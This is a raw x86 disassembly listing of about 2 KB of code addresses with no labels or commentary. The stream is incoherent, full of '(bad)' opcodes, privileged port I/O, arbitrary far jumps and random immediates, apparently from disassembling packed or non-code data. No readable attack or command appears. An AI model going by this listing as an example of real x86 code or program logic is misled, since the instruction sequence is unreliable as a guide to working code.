  4141ca:	int3   
  4141cb:	jo     0x4141eb
  4141cd:	sti    
  4141ce:	push   esp
  4141cf:	stos   BYTE PTR es:[edi],al
  4141d0:	push   esi
  4141d1:	jne    0x414190
  4141d3:	jecxz  0x4141f7
  4141d5:	mov    dh,0x95
  4141d7:	push   esi
  4141d8:	push   ecx
  4141d9:	sub    edi,DWORD PTR ds:0x2df4d2d8
  4141df:	loope  0x414186
  4141e1:	test   bh,al
  4141e3:	mov    edi,0x63d72225
  4141e8:	sbb    DWORD PTR [edx+0xc2a7301],edi
  4141ee:	out    dx,eax
  4141ef:	push   edx
  4141f0:	sub    DWORD PTR [ebp-0x15],esi
  4141f3:	push   edx
  4141f4:	sbb    edx,ebp
  4141f6:	xor    DWORD PTR [esi+0x2c2a125a],ebp
  4141fc:	or     DWORD PTR [edx],edi
  4141fe:	jbe    0x4141fe
  414200:	ret    
  414201:	cli    
  414202:	inc    esi
  414203:	inc    esp
  414204:	pop    edi
  414205:	inc    esp
  414206:	sbb    al,0x8d
  414208:	jmp    0xbb09:0xfecc8fbc
  41420f:	mov    ds:0xcfc6d9ca,al
  414214:	cli    
  414215:	rcr    DWORD PTR [ebx+0x2b229a68],cl
  41421b:	cmp    dl,BYTE PTR [esi]
  41421d:	retf   
  41421e:	pushf  
  41421f:	push   edx
  414220:	mov    eax,0x798275fa
  414225:	push   ebp
  414226:	jecxz  0x4141b4
  414228:	sbb    al,0x5e
  41422a:	inc    eax
  41422b:	in     al,0xc8
  41422d:	jmp    0x4141bd
  41422f:	out    dx,al
  414230:	dec    ebp
  414231:	lds    esi,FWORD PTR [eax-0xb5e9448]
  414237:	xlat   BYTE PTR ds:[ebx]
  414238:	sbb    al,0x89
  41423a:	xor    ecx,DWORD PTR [ecx+0x30]
  41423d:	push   ebp
  41423e:	push   edi
  41423f:	xor    eax,esp
  414241:	ror    DWORD PTR [esi-0x10],0xf
  414245:	adc    dh,BYTE PTR [edx+0xe929df1]
  41424b:	sahf   
  41424c:	pop    ss
  41424d:	mov    esi,0xab97be5d
  414252:	sahf   
  414253:	retf   
  414254:	lods   eax,DWORD PTR ds:[esi]
  414255:	jge    0x414208
  414257:	xor    al,0x20
  414259:	jg     0x41421b
  41425b:	int3   
  41425c:	add    al,0x4e
  41425e:	hlt    
  41425f:	in     al,dx
  414260:	test   DWORD PTR [edi],0x94d7e62f
  414266:	sub    eax,0x976833
  41426b:	js     0x4142e8
  41426d:	cmp    cl,BYTE PTR [esi+0x43]
  414270:	dec    esp
  414271:	sbb    ecx,ebx
  414273:	aaa    
  414274:	jb     0x41427e
  414276:	jbe    0x4142b2
  414278:	push   ds
  414279:	sub    BYTE PTR [esi+0x76],ch
  41427c:	loope  0x41424e
  41427e:	cli    
  41427f:	mov    bh,0x4e
  414281:	fdiv   QWORD PTR [ebp+0x3f]
  414284:	mov    ah,0x44
  414286:	xchg   BYTE PTR [ebp-0x21bd1355],al
  41428c:	fnsave [ecx]
  41428e:	out    dx,al
  41428f:	or     BYTE PTR [edx+0x3a],al
  414292:	pop    ecx
  414293:	adc    BYTE PTR [ebp-0x4b],0x2a
  414297:	call   0x735f1948
  41429c:	mov    edi,0x6a981c7f
  4142a1:	(bad)  
  4142a2:	enter  0xb65e,0xd0
  4142a6:	out    dx,al
  4142a7:	pop    ecx
  4142a8:	or     esi,edx
  4142aa:	test   eax,0x7cc5e771
  4142af:	sub    DWORD PTR [edi],edi
  4142b1:	fidiv  DWORD PTR [eax-0x7f]
  4142b4:	nop
  4142b5:	xchg   ebp,eax
  4142b6:	(bad)  
  4142b7:	jp     0x4142e3
  4142b9:	xor    eax,0xb026070
  4142be:	xor    DWORD PTR [edi],edi
  4142c0:	lock int3 
  4142c2:	add    BYTE PTR [ecx+0x28],ah
  4142c5:	sbb    BYTE PTR [ebx-0x63],cl
  4142c8:	push   sp
  4142ca:	cmc    
  4142cb:	pushf  
  4142cc:	bound  ebx,QWORD PTR [esi+eax*1]
  4142cf:	xchg   edx,eax
  4142d0:	int3   
  4142d1:	dec    edx
  4142d2:	xchg   DWORD PTR [esi-0x17db4fde],esi
  4142d8:	arpl   WORD PTR [edx+0x27b7cde0],cx
  4142de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142df:	add    eax,0x2374216d
  4142e4:	pop    es
  4142e5:	xchg   edi,eax
  4142e6:	out    dx,al
  4142e7:	jno    0x4142ab
  4142e9:	int    0x97
  4142eb:	out    dx,al
  4142ec:	fwait
  4142ed:	mov    ds:0xf70264cc,eax
  4142f2:	in     al,dx
  4142f3:	add    DWORD PTR [eax],0xb648703d
  4142f9:	outs   dx,BYTE PTR ds:[esi]
  4142fa:	pop    edi
  4142fb:	fld    DWORD PTR [esi+0x154f2ab6]
  414301:	and    dl,BYTE PTR [ecx+0x662c9019]
  414307:	jp     0x414346
  414309:	div    DWORD PTR [edi+esi*2]
  41430c:	dec    edi
  41430d:	int    0xa4
  41430f:	cmp    al,0xfb
  414311:	repnz cli 
  414313:	and    DWORD PTR [ecx-0x3b],ecx
  414316:	xor    edi,ecx
  414318:	mov    dh,BYTE PTR [ecx]
  41431a:	jo     0x41432e
  41431c:	mov    edx,DWORD PTR [eax+0x3ba43b1a]
  414322:	lea    edx,[ecx+0x533b9b05]
  414328:	mov    dh,0x60
  41432a:	mov    cl,0xa5
  41432c:	mov    ah,0xe
  41432e:	mov    eax,0x9af007bb
  414333:	jge    0x41433c
  414335:	stc    
  414336:	cmp    ch,BYTE PTR [ebx]
  414338:	mov    BYTE PTR [edx-0x3b],cl
  41433b:	dec    ecx
  41433c:	or     al,0x4e
  41433e:	rcl    esp,cl
  414340:	scas   eax,DWORD PTR es:[edi]
  414341:	and    BYTE PTR [ecx],cl
  414343:	sahf   
  414344:	mov    edi,0x4348fea3
  414349:	loopne 0x4143a0
  41434b:	mov    DWORD PTR [esi+0x79],esi
  41434e:	push   0x10
  414350:	and    BYTE PTR [edi+0x13],0x79
  414354:	pop    edi
  414355:	hlt    
  414356:	mov    edx,0xb5b81274
  41435b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41435c:	repz pop edx
  41435e:	mov    eax,0x5899d356
  414363:	jmp    0x29b8cb34
  414368:	or     eax,esp
  41436a:	popa   
  41436b:	or     eax,0x2649c56
  414370:	sbb    dl,BYTE PTR [edi]
  414372:	div    BYTE PTR [esi+0xe]
  414375:	push   0x67b5ac95
  41437a:	and    al,BYTE PTR ds:0x1fb6aaf3
  414380:	pop    ebp
  414381:	mov    ds:0xb4f895d0,al
  414386:	add    edx,esi
  414388:	dec    esp
  414389:	jns    0x41438e
  41438b:	shl    dl,cl
  41438d:	cmp    al,0x42
  41438f:	ret    
  414390:	push   esi
  414391:	dec    ecx
  414392:	sbb    ebx,0x61e999b7
  414398:	fmul   QWORD PTR [eax]
  41439a:	mov    eax,0xa41be58c
  41439f:	in     al,dx
  4143a0:	fbstp  TBYTE PTR [esi-0x6e]
  4143a3:	popa   
  4143a4:	inc    edi
  4143a5:	iret   
  4143a6:	inc    ecx
  4143a7:	in     al,0x98
  4143a9:	jo     0x4143ba
  4143ab:	inc    ecx
  4143ac:	fld    TBYTE PTR [edx-0x14]
  4143af:	popa   
  4143b0:	adc    eax,0x150113d9
  4143b5:	mov    esp,ebx
  4143b7:	(bad)  
  4143b8:	into   
  4143b9:	and    eax,esp
  4143bb:	push   es
  4143bc:	jo     0x41442e
  4143be:	sti    
  4143bf:	push   0x6a
  4143c1:	push   edi
  4143c2:	jbe    0x41443f
  4143c4:	adc    al,0x9e
  4143c6:	lock clc 
  4143c8:	xchg   BYTE PTR es:[edi+0x71767382],ah
  4143cf:	lods   al,BYTE PTR ds:[esi]
  4143d0:	cmp    BYTE PTR [ecx+0x2ece5c6f],dh
  4143d6:	pusha  
  4143d7:	sbb    al,0xbd
  4143d9:	shl    DWORD PTR [ecx-0x7c0efdf2],cl
  4143df:	xchg   DWORD PTR [ebx+eax*4-0x143013fd],ebx
  4143e6:	jo     0x414379
  4143e8:	data16 into 
  4143ea:	lahf   
  4143eb:	cli    
  4143ec:	xor    eax,0x61950583
  4143f1:	int3   
  4143f2:	dec    esp
  4143f3:	inc    DWORD PTR [ebx+0xd]
  4143f6:	mov    eax,ds:0xc97aeca5
  4143fb:	pop    edi
  4143fc:	mov    bh,0x29
  4143fe:	bound  edi,QWORD PTR [esi-0x74b55ee6]
  414404:	cwde   
  414405:	pop    edi
  414406:	cli    
  414407:	push   ds
  414408:	aam    0xb2
  41440a:	not    BYTE PTR [ebp-0x3704e2aa]
  414410:	es ss enter 0x60ad,0xa
  414416:	inc    ebx
  414417:	sub    esp,DWORD PTR [edx]
  414419:	ret    
  41441a:	or     ecx,DWORD PTR [ebx+eiz*8+0xc]
  41441e:	jae    0x414421
  414420:	xchg   ebx,eax
  414421:	jmp    0x1c54:0x9e7fcd21
  414428:	mov    ebp,esi
  41442a:	jb     0x4143e8
  41442c:	jp     0x4143ca
  41442e:	pop    esi
  41442f:	imul   edx,DWORD PTR [eax+0x1abb1817],0x61
  414436:	dec    ebp
  414437:	shr    ebp,0x72
  41443a:	test   BYTE PTR [edx-0x5797c390],bh
  414440:	pop    ecx
  414441:	popa   
  414442:	adc    DWORD PTR [edx],esp
  414444:	inc    ecx
  414445:	and    al,dh
  414447:	sar    DWORD PTR es:[eax+0x41],0xba
  41444c:	daa    
  41444d:	and    eax,0xff66094b
  414452:	aaa    
  414453:	pop    edx
  414454:	sub    eax,0x27aca618
  414459:	cs ins BYTE PTR es:[edi],dx
  41445b:	call   0x36dd:0x730cbab
  414462:	lods   eax,DWORD PTR ds:[esi]
  414463:	mov    eax,ds:0x686e2641
  414468:	push   esi
  414469:	mov    cl,0x8a
  41446b:	dec    ecx
  41446c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41446d:	pop    esi
  41446f:	mov    DWORD PTR [esi+0x1],esi
  414472:	lea    edi,[eax-0x7de745a6]
  414478:	xor    al,0xbd
  41447a:	pop    ss
  41447b:	enter  0xb061,0x4c
  41447f:	out    0x8a,al
  414481:	push   edi
  414482:	shr    esi,cl
  414484:	cwde   
  414485:	jp     0x4144d9
  414487:	ins    BYTE PTR es:[edi],dx
  414488:	push   cs
  414489:	jmp    0x7815:0xfc12f989
  414490:	test   DWORD PTR [eax-0x37998cef],0x88f328d8
  41449a:	icebp  
  41449b:	retf   
  41449c:	aad    0x33
  41449e:	lahf   
  41449f:	ret    0x6ae4
  4144a2:	lds    ebx,FWORD PTR [ebx]
  4144a4:	test   al,0xe5
  4144a6:	push   ebx
  4144a7:	xor    DWORD PTR [esi-0x60],0x3b
  4144ab:	test   DWORD PTR [edi],edi
  4144ad:	ffree  st(1)
  4144b0:	cwde   
  4144b1:	push   ebx
  4144b2:	adc    DWORD PTR [edx-0x6ce94a66],0x2c
  4144b9:	ss xchg esp,eax
  4144bb:	push   ecx
  4144bc:	out    0xab,eax
  4144be:	mov    al,0x7
  4144c0:	mov    esp,0xb47b7b25
  4144c5:	and    al,0xff
  4144c7:	fidivr DWORD PTR [ebx+0x5bdd27ce]
  4144cd:	arpl   WORD PTR [ecx+0x33],sp
  4144d0:	push   eax
  4144d1:	add    al,0x4
  4144d3:	pop    eax
  4144d4:	inc    eax
  4144d5:	mov    eax,ds:0x1750b5ad
  4144da:	sar    DWORD PTR es:[eax+esi*2+0x71158a86],1
  4144e2:	into   
  4144e3:	jp     0x41454e
  4144e5:	mov    ch,0x8b
  4144e7:	in     eax,dx
  4144e8:	ret    
  4144e9:	push   ecx
  4144ea:	push   es
  4144eb:	add    DWORD PTR [ebx-0x14],edi
  4144ee:	xor    BYTE PTR [edi],al
  4144f0:	bound  edi,QWORD PTR [eax-0x645d1ded]
  4144f6:	push   ebx
  4144f7:	ins    DWORD PTR es:[edi],dx
  4144f8:	push   esp
  4144f9:	sbb    bl,BYTE PTR ds:0x486e182b
  4144ff:	push   ds
  414500:	push   edx
  414501:	pop    ss
  414502:	test   DWORD PTR [eax+0x37013556],0x5329ea6f
  41450c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41450d:	stos   DWORD PTR es:[edi],eax
  41450e:	xchg   BYTE PTR ds:0xba5a8df8,al
  414514:	ins    BYTE PTR es:[edi],dx
  414515:	mov    dh,ah
  414517:	stc    
  414518:	cli    
  414519:	and    al,0x42
  41451b:	add    BYTE PTR [eax+0x21770337],cl
  414521:	jle    0x4144c6
  414523:	add    al,0x11
  414525:	rcr    al,0x14
  414528:	mov    ebx,0x5312a830
  41452d:	out    0xe2,al
  41452f:	mov    ch,0x8a
  414531:	mov    es,WORD PTR [ecx-0x5d]
  414534:	mov    al,0xd4
  414536:	fwait
  414537:	push   0xffffffdd
  414539:	sbb    eax,0x5dab948f
  41453e:	xor    ch,BYTE PTR ds:0x2d849b2c
  414544:	je     0x4144dc
  414546:	cmp    DWORD PTR [edi],ebx
  414548:	inc    ecx
  414549:	shl    BYTE PTR [ebx+0x1dce9cb1],0x19
  414550:	lock daa 
  414552:	add    eax,0xddc23b71
  414557:	std    
  414558:	aaa    
  414559:	enter  0x81b,0xd6
  41455d:	xchg   esi,eax
  41455e:	fcomp  st(1)
  414560:	outs   dx,DWORD PTR ds:[esi]
  414561:	hlt    
  414562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414563:	rol    BYTE PTR [ecx],1
  414565:	dec    ebx
  414566:	cmc    
  414567:	xchg   edx,eax
  414568:	fist   WORD PTR [esi+0x3e802577]
  41456e:	sbb    ch,BYTE PTR [edi]
  414570:	popf   
  414571:	call   0x3ab8cfaf
  414576:	fstp   QWORD PTR [edi]
  414578:	sub    ecx,0x79
  41457b:	mov    bl,BYTE PTR [ebp-0x249940aa]
  414581:	loope  0x41455e
  414583:	sti    
  414584:	xchg   DWORD PTR [ebp+0x4d02d308],edx
  41458a:	imul   ebx,DWORD PTR ds:0xfbbd2704,0xce31dedb
  414594:	and    DWORD PTR [ebx-0x4f],edi
  414597:	dec    edi
  414598:	add    eax,0x2d585429
  41459d:	(bad)  
  41459e:	mov    al,ds:0x2ab32d21
  4145a3:	fstp   st(0)
  4145a5:	lods   al,BYTE PTR ds:[esi]
  4145a6:	stos   BYTE PTR es:[edi],al
  4145a7:	stc    
  4145a8:	lods   eax,DWORD PTR ds:[esi]
  4145a9:	jge    0x414565
  4145ab:	add    BYTE PTR [eax+eax*1],cl
  4145ae:	mov    cl,0x60
  4145b0:	push   edx
  4145b1:	test   BYTE PTR [ecx+0x72e39d44],dh
  4145b7:	push   ebx
  4145b8:	mov    ds:0xf2bed9f0,eax
  4145bd:	add    DWORD PTR [edi-0x6a],ebx
  4145c0:	push   eax
  4145c1:	bound  edx,QWORD PTR ds:0x2f4af4f1
  4145c7:	fiadd  WORD PTR [edx+0x55]
  4145ca:	push   es
  4145cb:	pop    ss
  4145cc:	dec    esi
  4145cd:	ins    BYTE PTR es:[edi],dx
  4145ce:	sub    dl,BYTE PTR [ebp+0x37]
  4145d1:	lock push edx
  4145d3:	lea    ecx,[eax+0x60]
  4145d6:	pop    ecx
  4145d7:	je     0x414632
  4145d9:	and    bh,ah
  4145db:	dec    esp
  4145dc:	das    
  4145dd:	mov    ah,0xab
  4145df:	dec    esp
  4145e0:	mov    ebx,0x2190b41d
  4145e5:	sbb    cl,BYTE PTR [ebx-0x53421a4b]
  4145eb:	mov    esp,0xcf393909
  4145f0:	inc    DWORD PTR [esi-0x60]
  4145f3:	mov    bh,0xb2
  4145f5:	repnz sbb ch,BYTE PTR [esi+0x6b848064]
  4145fc:	fidivr WORD PTR [edx-0x5b25dea8]
  414602:	int3   
  414603:	repnz mov ?,WORD PTR [esi+0x4f]
  414607:	mov    ds:0xbfb71cb0,al
  41460c:	aam    0xe1
  41460e:	stos   BYTE PTR es:[edi],al
  41460f:	xor    BYTE PTR [eax+0x6e],bh
  414612:	mov    edx,0x5a22f714
  414617:	in     al,dx
  414618:	mov    edi,0xa327cdb0
  41461d:	xchg   ebp,eax
  41461e:	mov    ch,0x8f
  414620:	add    BYTE PTR [ebx-0x4281a317],bh
  414626:	fwait
  414627:	adc    al,0x20
  414629:	push   ecx
  41462a:	jne    0x414662
  41462c:	mov    ah,0x82
  41462e:	xlat   BYTE PTR ds:[ebx]
  41462f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414630:	adc    bl,ah
  414632:	fisttp DWORD PTR [eax]
  414634:	(bad)  
  414635:	int    0x64
  414637:	lds    esp,FWORD PTR [eax+0x10]
  41463a:	(bad)  
  41463b:	fisttp WORD PTR [ecx+0x71]
  41463e:	std    
  41463f:	and    ah,BYTE PTR [esi]
  414641:	lds    ecx,FWORD PTR [edx+edi*8+0x40be69a1]
  414648:	and    DWORD PTR [esi+0x49c39074],edx
  41464e:	bound  esi,QWORD PTR [ebx+ebx*1]
  414651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414652:	fistp  DWORD PTR [ebx-0x528eb671]
  414658:	mov    edi,0xc5d98c37
  41465d:	imul   ebp,DWORD PTR [esi-0x1f],0x1fdfa678
  414664:	cs pusha 
  414666:	adc    BYTE PTR [ecx],cl
  414668:	stc    
  414669:	fimul  WORD PTR [ebx-0x773e5acf]
  41466f:	mov    BYTE PTR [ebx+0x66],bl
  414672:	lods   eax,DWORD PTR ds:[esi]
  414673:	xor    eax,0x4350a420
  414678:	mov    eax,0xb990ab70
  41467d:	push   edi
  41467e:	ja     0x414614
  414680:	and    ah,BYTE PTR ds:0x6623a4e3
  414686:	lds    edx,FWORD PTR [eax+ebp*1+0x11d8b472]
  41468d:	test   BYTE PTR [eax-0x3c],bl
  414690:	mov    esi,0x19ed2bcb
  414695:	(bad)  
  414696:	ficom  WORD PTR [esi+ebx*8+0x2c40fe0e]
  41469d:	mov    ch,0xa2
  41469f:	(bad)  
  4146a1:	sbb    ah,ch
  4146a3:	arpl   cx,dx
  4146a5:	mov    BYTE PTR [ebp+0x2064c3e4],ah
  4146ab:	icebp  
  4146ac:	sbb    al,0x16
  4146ae:	jmp    0x7318:0x2cfa284
  4146b5:	or     esi,DWORD PTR [esi-0x28]
  4146b8:	mov    dl,0xc9
  4146ba:	jbe    0x4146ae
  4146bc:	xor    DWORD PTR [eax],0xffffffc4
  4146bf:	mov    BYTE PTR [ebp+0x23],ah
  4146c2:	int3   
  4146c3:	or     dh,BYTE PTR [edi+0x50961ca0]
  4146c9:	jnp    0x4146fb
  4146cb:	stos   BYTE PTR es:[edi],al
  4146cc:	xchg   BYTE PTR [edx],ah
  4146ce:	ja     0x414715
  4146d0:	dec    esp
  4146d1:	or     DWORD PTR [esi],edx
  4146d3:	push   es
  4146d4:	dec    edi
  4146d5:	fwait
  4146d6:	add    dh,bl
  4146d8:	mov    eax,ecx
  4146da:	les    esi,FWORD PTR [esi+0x3ba5e323]
  4146e0:	test   BYTE PTR [ebp-0x4154238d],al
  4146e6:	xchg   esp,eax
  4146e7:	(bad)  
  4146e8:	loopne 0x414694
  4146ea:	xchg   edx,eax
  4146eb:	out    0x3d,al
  4146ed:	xchg   esp,eax
  4146ee:	lods   al,BYTE PTR ds:[esi]
  4146ef:	inc    esp
  4146f0:	jns    0x414672
  4146f2:	enter  0x168,0x15
  4146f6:	lods   eax,DWORD PTR ds:[esi]
  4146f7:	xlat   BYTE PTR ds:[ebx]
  4146f8:	sub    BYTE PTR [ebp-0xecb637b],ah
  4146fe:	mov    ds:0xacbd1377,eax
  414703:	retf   
  414704:	add    cl,al
  414706:	push   eax
  414707:	in     al,0x83
  414709:	fisttp WORD PTR [ebp-0x36]
  41470c:	push   ds
  41470d:	popa   
  41470e:	imul   ebp,ebp,0x51
  414711:	js     0x4146a6
  414713:	mov    edx,0x432443e3
  414718:	and    al,BYTE PTR [ebx]
  41471a:	xchg   esi,eax
  41471b:	inc    ebp
  41471c:	test   BYTE PTR [edx+0x36],0x5c
  414720:	and    sp,WORD PTR [esi]
  414723:	mov    al,0x54
  414725:	cmp    BYTE PTR [esi],bh
  414727:	(bad)  
  414728:	push   ecx
  414729:	dec    edi
  41472a:	iret   
  41472b:	add    eax,0xd538ab82
  414730:	push   cs
  414731:	(bad)  
  414732:	cmp    al,0x27
  414734:	dec    edx
  414735:	mov    bl,BYTE PTR [esi-0x19]
  414738:	je     0x4146df
  41473a:	sbb    ebp,0xffffffae
  41473d:	cmp    ebx,0xc37ad061
  414743:	retf   
  414744:	ret    
  414745:	jecxz  0x4146d3
  414747:	xor    esi,eax
  414749:	in     al,0x67
  41474b:	retf   
  41474c:	mov    al,0xd8
  41474e:	or     edi,DWORD PTR [ecx]
  414750:	xor    ch,bl
  414752:	add    al,0x87
  414754:	mov    WORD PTR [edi+ebx*2+0x70283f80],ss
  41475b:	sbb    edi,DWORD PTR [esi]
  41475d:	and    BYTE PTR [ecx-0x41],ah
  414760:	push   ds
  414761:	fs clc 
  414763:	xchg   ebx,eax
  414764:	push   es
  414765:	loopne 0x414766
  414767:	xor    edi,0x71932698
  41476d:	dec    esp
  41476e:	cld    
  41476f:	(bad)  
  414770:	imul   edx,esp,0xaadf19f3
  414776:	or     DWORD PTR [ebx+0x3c],esp
  414779:	out    0x8a,eax
  41477b:	xchg   BYTE PTR [edi-0x1],bh
  41477e:	out    dx,al
  41477f:	ds out 0x6,al
  414782:	sti    
  414783:	fwait
  414784:	and    BYTE PTR [ebp-0x739b9d11],bl
  41478a:	jecxz  0x4147ad
  41478c:	xchg   edi,eax
  41478d:	jmp    0x10eb69b6
  414792:	push   edi
  414793:	cmp    eax,0x341651a5
  414798:	push   ebp
  414799:	add    DWORD PTR [eax],eax
  41479b:	mov    bh,0x50
  41479d:	adc    dl,BYTE PTR [ecx+eax*4+0x68820d54]
  4147a4:	xchg   BYTE PTR [esi],bl
  4147a6:	mov    eax,0x1de80001
  4147ab:	test   al,0x4b
  4147ad:	bnd jge 0x4147db
  4147b0:	ret    0xed99
  4147b3:	jp     0x41474e
  4147b5:	sbb    al,0x9b
  4147b7:	add    eax,0x9345a9e5
  4147bc:	jp     0x414741
  4147be:	ins    DWORD PTR es:[edi],dx
  4147bf:	sub    al,ch
  4147c1:	xchg   esi,eax
  4147c2:	mov    ebp,0x42ea530b
  4147c7:	fidivr DWORD PTR [eax-0x33]
  4147ca:	dec    esp
  4147cb:	stos   DWORD PTR es:[edi],eax
  4147cc:	and    BYTE PTR [esi+0x36],cl
  4147cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147d0:	add    esi,ebx
  4147d2:	xchg   dh,dl
  4147d4:	pushf  
  4147d5:	in     eax,dx
  4147d6:	mov    bh,BYTE PTR [ebp+ebp*1-0x77]
  4147da:	add    eax,ecx
  4147dc:	mov    BYTE PTR [esi+0xb],dl
  4147df:	clc    
  4147e0:	mov    cl,BYTE PTR [ecx]
  4147e2:	fsubr  QWORD PTR [ebp+0xf]
  4147e5:	add    eax,0x35309f18
  4147ea:	(bad)  
  4147eb:	mul    edx
  4147ed:	push   ss
  4147ee:	sub    ecx,DWORD PTR [ebx-0x2421352c]
  4147f4:	pop    ds
  4147f5:	pop    ds
  4147f6:	dec    edi
  4147f7:	iret   
  4147f8:	sbb    eax,0xa6842107
  4147fd:	jp     0x414847
  4147ff:	iret   
  414800:	xchg   ebp,eax
  414801:	add    ebx,esp
  414803:	popf   
  414804:	retf   0x2bb3
  414807:	adc    DWORD PTR [edx+0x14639591],ebx
  41480d:	ret    0xfc70
  414810:	xchg   esi,eax
  414811:	sbb    DWORD PTR [ecx],edx
  414813:	lods   eax,DWORD PTR ds:[esi]
  414814:	push   0xffffff8e
  414816:	cmp    BYTE PTR [ebp+0x532a9692],al
  41481c:	dec    ebx
  41481d:	or     dl,BYTE PTR [ebx]
  41481f:	inc    esi
  414820:	push   edi
  414821:	enter  0xb23f,0xac
  414825:	sub    esi,DWORD PTR [esi]
  414827:	dec    eax
  414828:	sub    ah,dh
  41482a:	add    BYTE PTR [edx],dh
  41482c:	mov    edx,0x8ff1bd20
  414831:	mov    esp,0x1c78595f
  414836:	and    DWORD PTR ds:0xafe75613,edx
  41483c:	adc    BYTE PTR [eax+0x17f74611],bl
  414842:	sbb    DWORD PTR [ebx-0xd00d1ed],ecx
  414848:	sub    DWORD PTR [ebx+0x78],ecx
  41484b:	dec    ebp
  41484c:	adc    al,0x5
  41484e:	cmp    eax,0x3ce19a
  414853:	jno    0x41482a
  414855:	test   BYTE PTR [esi-0x64f901e9],0x3b
  41485c:	cmp    bh,BYTE PTR [ecx-0x4ea3ef17]
  414862:	stos   DWORD PTR es:[edi],eax
  414863:	in     al,dx
  414864:	in     eax,dx
  414865:	icebp  
  414866:	mov    ecx,DWORD PTR [esi+0x4c04c8e1]
  41486c:	mov    ebx,?
  41486e:	call   0x3308:0x1b06b595
  414875:	jb     0x414884
  414877:	sub    DWORD PTR [eax-0x13],eax
  41487a:	push   ecx
  41487b:	int3   
  41487c:	mov    bl,0x77
  41487e:	lods   eax,DWORD PTR ds:[esi]
  41487f:	mov    edi,0x413381f9
  414884:	test   al,0xa7
  414886:	fwait
  414887:	mov    al,ds:0xce7fa0ea
  41488c:	dec    edx
  41488d:	ins    DWORD PTR es:[edi],dx
  41488e:	emms   
  414890:	dec    edx
  414891:	sbb    ch,cl
  414893:	adc    eax,0xca51698a
  414898:	cld    
  414899:	scas   al,BYTE PTR es:[edi]
  41489a:	repnz push edx
  41489c:	in     eax,0xae
  41489e:	jb     0x414834
  4148a0:	cdq    
  4148a1:	data16 setl BYTE PTR [edi-0x11122113]
  4148a9:	in     eax,0x2b
  4148ab:	cmp    BYTE PTR [esi+0x7],cl
  4148ae:	fwait
  4148af:	dec    esi
  4148b0:	sahf   
  4148b1:	sub    BYTE PTR [esi+0x29],al
  4148b4:	jmp    0x414884
  4148b6:	cmp    eax,0xf6aa1cca
  4148bb:	stos   BYTE PTR es:[edi],al
  4148bc:	pop    ss
  4148bd:	lods   al,BYTE PTR ds:[esi]
  4148be:	xchg   esp,eax
  4148bf:	jp     0x4148c2
  4148c1:	(bad)  
  4148c2:	leave  
  4148c3:	fwait
  4148c4:	scas   al,BYTE PTR es:[edi]
  4148c5:	xchg   ebx,eax
  4148c6:	fst    QWORD PTR [eax+0xe]
  4148c9:	sub    DWORD PTR [eax-0x706b3720],eax
  4148cf:	dec    esp
  4148d0:	push   ebp
  4148d1:	mov    esp,0xf124b7b0
  4148d6:	xor    BYTE PTR [ebp+0x2],dl
  4148d9:	adc    al,0x6b
  4148db:	repnz in eax,dx
  4148dd:	jmp    0xebdba9a6
  4148e2:	stos   DWORD PTR es:[edi],eax
  4148e3:	mov    ds:0x5c5d0d56,al
  4148e8:	add    al,0xe1
  4148ea:	gs jne 0x414909
  4148ed:	push   ds
  4148ee:	ret    0x57e
  4148f1:	mov    BYTE PTR [ecx+0x55],bh
  4148f4:	test   eax,0xe359de19
  4148f9:	jb     0x4148b4
  4148fb:	push   ecx
  4148fc:	mul    DWORD PTR [ecx+0x34ed080b]
  414902:	inc    esi
  414903:	or     eax,0xe2fd87d2
  414908:	mov    esi,0xf607ed95
  41490d:	rcr    DWORD PTR [ecx+0x361da2c2],0x83
  414914:	fdivr  QWORD PTR [eax-0x44c6563a]
  41491a:	out    0xcf,al
  41491c:	push   ds
  41491d:	(bad)  
  41491e:	enter  0x1ec6,0x3c
  414922:	lahf   
  414923:	adc    DWORD PTR [ecx+0x7d38d593],eax
  414929:	adc    edi,DWORD PTR [ebx+0x143dabe8]
  41492f:	jmp    0x414987
  414931:	push   ebp
  414932:	jmp    0x2704:0x8a0b8192
  414939:	push   esi
  41493a:	inc    edx
  41493b:	out    0xaf,al
  41493d:	push   cs
  41493e:	dec    esi
  41493f:	and    cl,BYTE PTR [edx+0x39f1c807]
  414945:	cmp    edx,DWORD PTR [esp+ecx*2]
  414948:	mov    ah,0x7e
  41494a:	jne    0x414937
  41494c:	mov    esp,0x942cfac2
  414951:	xlat   BYTE PTR ds:[ebx]
  414952:	mov    ah,0x4
  414954:	leave  
  414955:	arpl   WORD PTR [ebx+0x0],bp
  414958:	aam    0x91
  41495a:	and    al,0xb8
  41495c:	lea    ecx,[ebx]
  41495e:	inc    ebx
  41495f:	ds jmp 0x9f6a7920
  414965:	add    al,0x9d
  414967:	mov    ebx,0xbf23f435
  41496c:	dec    esp
  41496d:	(bad)  
  41496e:	push   esp
  41496f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  414971:	sti    
  414972:	push   edi
  414973:	cmp    DWORD PTR [esi],ebx
  414975:	dec    ecx
  414976:	xchg   edx,eax
  414977:	add    ebx,DWORD PTR [edi+0x6c]
  41497a:	and    DWORD PTR [edx],edx
  41497c:	mul    DWORD PTR [ebx+0x3e]
  41497f:	adc    DWORD PTR [eax-0xd],0xfffffff1
  414983:	addr16 stc 
  414985:	push   0x4976322a
  41498a:	fcmove st,st(0)
  41498c:	pop    ds
  41498d:	dec    esp
  41498e:	dec    eax
  41498f:	fld    DWORD PTR [esi+ebp*4]
  414992:	test   al,0x20
  414994:	lock inc esp
  414996:	scas   eax,DWORD PTR es:[edi]
  414997:	ret    0xdd93
  41499a:	xchg   BYTE PTR [ecx-0x75],ch
  41499d:	stc    
  41499e:	je     0x4149af
  4149a0:	repz mov fs,WORD PTR [ecx+0x44]
  4149a4:	scas   al,BYTE PTR es:[edi]
  4149a5:	pop    ecx
  4149a6:	ins    BYTE PTR es:[edi],dx
  4149a7:	and    eax,0xe1093e73
  4149ac:	mov    ds:0x331fde45,eax
  4149b1:	(bad)  [ebx+0x49]
  4149b4:	cmp    BYTE PTR [ecx+edx*1+0x74b39224],ah
  4149bb:	or     eax,0x570bf81f
  4149c0:	fisttp QWORD PTR [ebx]
